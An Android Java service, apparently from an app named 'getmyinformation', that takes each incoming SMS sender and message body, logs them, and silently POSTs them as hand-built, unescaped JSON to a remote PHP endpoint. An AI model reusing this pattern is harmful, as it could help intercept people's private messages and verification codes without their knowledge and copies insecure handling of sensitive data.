package com.example.getmyinformation;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;



public class SmsService extends Service {
    private static final String TAG = "SmsService";

    @Override
    public IBinder onBind(Intent intent) {
        // Not bound, so returning null
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String sender = intent.getStringExtra("sender");
        String message = intent.getStringExtra("message");


        Log.d(TAG, "Sender: " + sender + ", Message: " + message);
        sendDataToServer(sender, message);


        return START_NOT_STICKY;
    }


    private void sendDataToServer(String sender, String message) {
        // Background thread to handle network operation
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Define your server URL where you want to send the data
                    URL url = new URL("https://backuptrack.salumtransports.co.tz/sms-handler.php");
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setRequestMethod("POST");
                    urlConnection.setDoOutput(true);
                    urlConnection.setRequestProperty("Content-Type", "application/json");

                    // Prepare the JSON data
                    String jsonInputString = "{"
                            + "\"sender\": \"" + sender + "\","
                            + "\"message\": \"" + message + "\""
                            + "}";

                    // Write the JSON data to the request body
                    try (OutputStream os = urlConnection.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes("utf-8");
                        os.write(input, 0, input.length);
                    }

                    // Get the server response (optional)
                    int responseCode = urlConnection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        Log.d(TAG, "Data sent successfully to the server.");
                    } else {
                        Log.e(TAG, "Failed to send data. Response Code: " + responseCode);
                    }

                    urlConnection.disconnect();
                } catch (Exception e) {
                    Log.e(TAG, "Error sending data to server: ", e);
                }
            }
        }).start();
    }





}
